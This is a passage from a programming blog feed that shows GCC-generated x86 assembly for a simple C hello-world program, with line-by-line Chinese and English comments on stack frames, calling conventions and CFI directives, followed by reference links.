class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">/* gcc -S helloworld.c -o helloworld.asm */</span><br><span class="line">/* filename: helloworld.asm */</span><br><span class="line"></span><br><span class="line">    .file   &quot;helloworld.c&quot;</span><br><span class="line">    .section .rdata,&quot;dr&quot;</span><br><span class="line"></span><br><span class="line">LC0:</span><br><span class="line">    .ascii &quot;Received: %d\12\0&quot;</span><br><span class="line">    .text</span><br><span class="line">    .globl  _hello</span><br><span class="line">    .def    _hello; .scl    2;  .type   32; .endef</span><br><span class="line">_hello:                             hello 函数开始的地址</span><br><span class="line">LFB10:</span><br><span class="line">    .cfi_startproc                  cfi stands for call frame information</span><br><span class="line">                                    for debugging purpose [1] [2]</span><br><span class="line">    pushl   %ebp                    保护 main() 的栈基</span><br><span class="line">    .cfi_def_cfa_offset 8</span><br><span class="line">    .cfi_offset 5, -8</span><br><span class="line">    movl    %esp, %ebp              重设栈基，新空栈 [3]</span><br><span class="line">                                    进入(stdcall, [4])函数后首先需要的步骤</span><br><span class="line">    .cfi_def_cfa_register 5</span><br><span class="line">    subl    $24, %esp               我也不清楚为什么要拓展这么大的空间</span><br><span class="line">    movl    8(%ebp), %eax           8(%ebp) 就是传过来的 b</span><br><span class="line">                                    准备调用 printf()</span><br><span class="line">    movl    %eax, 4(%esp)           先把第二个参数入栈</span><br><span class="line">    movl    $LC0, (%esp)            再把第一个参数入栈，LC0 正好就是对应数据</span><br><span class="line">    call    _printf                 正式调用 printf()</span><br><span class="line">    movl    8(%ebp), %eax           准备好当前函数的 b（从内存中挪到寄存器）</span><br><span class="line">    addl    $333, %eax              b += 555</span><br><span class="line">                                    不用挪回内存，因为本函数已经不需要用到 b 了</span><br><span class="line">    leave</span><br><span class="line">    .cfi_restore 5</span><br><span class="line">    .cfi_def_cfa 4, 4</span><br><span class="line">    ret                             回到 main 函数</span><br><span class="line">                                    %eax 是约定好的放置函数返回值的地方 [4]</span><br><span class="line">    .cfi_endproc</span><br><span class="line"></span><br><span class="line">LFE10:</span><br><span class="line">    .def    ___main;    .scl    2;  .type   32; .endef</span><br><span class="line">    .section .rdata,&quot;dr&quot;</span><br><span class="line">LC1:</span><br><span class="line">    .ascii &quot;Passing arguments: %d, %d\12\0&quot;</span><br><span class="line">    .text</span><br><span class="line">    .globl  _main</span><br><span class="line">    .def    _main;  .scl    2;  .type   32; .endef</span><br><span class="line">_main:</span><br><span class="line">LFB11:</span><br><span class="line">    .cfi_startproc</span><br><span class="line">    pushl   %ebp                    保护栈基</span><br><span class="line">    .cfi_def_cfa_offset 8</span><br><span class="line">    .cfi_offset 5, -8</span><br><span class="line">    movl    %esp, %ebp              重设栈基，新空栈</span><br><span class="line">    .cfi_def_cfa_register 5</span><br><span class="line">    andl    $-16, %esp</span><br><span class="line">    subl    $32, %esp</span><br><span class="line">    call    ___main                 我也不清楚这个 __main 是什么</span><br><span class="line">    movl    $111, 28(%esp)          局部变量存在于栈中 [5]</span><br><span class="line">    movl    $222, 24(%esp)</span><br><span class="line">    movl    24(%esp), %eax          参数开始入栈，从右到左 [4]</span><br><span class="line">    movl    %eax, 8(%esp)</span><br><span class="line">    movl    28(%esp), %eax</span><br><span class="line">    movl    %eax, 4(%esp)</span><br><span class="line">    movl    $LC1, (%esp)</span><br><span class="line">    call    _printf                 正式调用 printf()</span><br><span class="line">    addl    $1, 28(%esp)            ++a</span><br><span class="line">    movl    24(%esp), %eax</span><br><span class="line">    movl    %eax, (%esp)            这两行使参数 b 入栈</span><br><span class="line">    call    _hello                  调用 hello</span><br><span class="line">                                    gcc 自动给函数名前缀一个 _ 符号</span><br><span class="line">                                    这在 c++ 中有不同的规则</span><br><span class="line">                                    所以有些代码需要 extern &quot;C&quot;</span><br><span class="line">    movl    %eax, 20(%esp)          hello() 的返回值置于 %eax，入栈成为局部变量 c</span><br><span class="line">    movl    $444, %eax              同样，%eax 放置函数返回值，main 也不例外</span><br><span class="line">    leave</span><br><span class="line">    .cfi_restore 5</span><br><span class="line">    .cfi_def_cfa 4, 4</span><br><span class="line">    ret</span><br><span class="line">    .cfi_endproc</span><br><span class="line">LFE11:</span><br><span class="line">    .ident  &quot;GCC: (GNU) 5.3.0&quot;</span><br><span class="line">    .def    _printf;    .scl    2;  .type   32; .endef</span><br></pre></td></tr></table></figure><hr><p>Reference:</p><ol><li><a href="https://stackoverflow.com/questions/29527623/in-assembly-code-how-cfi-directive-works/33732119#33732119" target="_blank" rel="noopener">In assembly code how .cfi directives work - An answer by @ysdx, Stackoverflow</a></li><li><a href="https://sourceware.org/binutils/docs-2.18/as/CFI-directives.html" target="_blank" rel="noopener">.cfi directives</a></li><li><a href="https://en.wikipedia.org/wiki/Call_stack#Structure" target="_blank" rel="noopener">Call stack #Structure, wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A#stdcall" target="_blank" rel="noopener">X86 调用约定 #stdcall, wikipedia</a></li><li><a href="https://www.jianshu.com/p/b2380e47d005" target="_blank" rel="noopener">C语言-内存管理基础, 简书</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li
      
    
    </summary>
    
    
      <category term="C" scheme="http://oyiadin.github.io/tags/C/"/>
    
      <category term="ASM" scheme="http://oyiadin.github.io/tags/ASM/"/>
    
  </entry>
  
</feed>
